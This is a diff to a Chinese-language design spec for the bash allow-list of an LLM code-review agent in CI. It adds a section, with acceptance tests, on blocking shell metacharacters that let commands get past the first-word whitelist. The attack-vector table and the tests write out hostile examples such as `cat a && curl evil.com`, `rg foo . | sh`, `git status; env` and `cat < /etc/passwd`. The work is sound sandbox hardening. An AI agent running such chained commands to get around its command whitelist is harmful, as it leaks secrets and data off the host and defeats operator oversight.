@@ -70,6 +70,23 @@ const BASH_ALLOW_LIST = /^(git|grep|rg|find|ls|cat|head|tail|nl|wc|file|sed|awk|
 - **执行链式**:`xargs` / `bash` / `sh` / `eval`
 - **包管理**:`npm` / `pip` / `apt` / `yum`
 
+#### R2.5 Shell 元字符防绕过(reviewer dogfooding 发现 · 2026-05-22)
+
+**问题**:仅校验首词 + 把整条 cmd 字符串交给 shell,会被命令链 / 重定向 / 管道 / 嵌套执行绕过。
+
+| 攻击向量 | 绕过路径 | 风险 |
+|---|---|---|
+| `git status; env` | 首词 git 命中 + `;` 串联跑 env | secret 泄漏 |
+| `cat a && curl evil.com` | 首词 cat 命中 + `&&` 链式 curl | 网络外发 |
+| `rg foo . \| sh` | 首词 rg 命中 + 管道到 sh 执行 | 任意代码执行 |
+| `echo x > /tmp/y` | 首词 echo 命中 + 重定向写文件 | 文件系统污染 |
+| `echo $(curl evil)` | 首词 echo 命中 + 命令替换 | 网络外发 |
+| `` git log `curl evil` `` | 首词 git 命中 + 反引号命令替换 | 网络外发 |
+
+**修复**:在白名单 test 之**前**先 reject 所有 shell 元字符:`;` `&&` `||` `|` `>` `<` `` ` `` `$(`。
+
+Trade-off:LLM 在 quote 内合法使用元字符(如 `grep "a|b" f`)会被一并拦截,但 LLM 评审场景几乎不需要,误拦时换写法即可(把每条命令拆成独立 bash 调用)。
+
 #### R2.3 错误信息保留 + 加替代建议(辅助优化)
 扩容后 LLM 触碰白名单外命令时,沿用原中文文案 `CI 只读模式:bash 命令 "<cmd>" 不在白名单内`,**追加** 1-2 行替代建议:
 - 想看 MR 元数据 → `gitlab_get_mr_files` / `gitlab_get_mr_diff`
@@ -120,6 +137,8 @@ const BASH_ALLOW_LIST = /^(git|grep|rg|find|ls|cat|head|tail|nl|wc|file|sed|awk|
 
 - [ ] **AC2.1** 新加的 18 个命令(rg/nl/sort/uniq/tr/column/diff/comm/printf/echo/basename/dirname/realpath/pwd/date/which/type/command)逐一放行(用 it.each 跑一遍)
 - [ ] **AC2.1.dockerfile** `packages/flower-code-reviewer/Dockerfile:44` 已改为 `RUN apk add --no-cache git ripgrep`(白名单放行后容器内可执行,e2e Phase 6 内 `rg --version` 不报 `command not found` 即视为通过)
+- [ ] **AC2.6** 含 shell 元字符的命令被拦截(在白名单 test 之前):`git status; env` / `rg foo . | sh` / `echo $(curl evil)` / `echo x > /tmp/y` / `cat a && curl evil` / `` git log `curl x` `` / `cat < /etc/passwd` 等;reason 含 `shell 元字符` + `禁止命令链`
+- [ ] **AC2.6b** 真实合法命令不被新检查误拦:`git status` / `rg foo packages/` / `awk '{print $1}' f` / `sed 's/a/b/' f` 仍放行
 - [ ] **AC2.2** `env` / `printenv` 仍被拦截(defense-in-depth)
 - [ ] **AC2.3** `curl` / `tee` / `mv` / `npm` 等高危命令仍被拦截
 - [ ] **AC2.4** 拦截信息保留原 `CI 只读模式:` 前缀,且包含替代工具建议字符串(如拦 `env` → 含 `不可,可能泄漏 secret`)
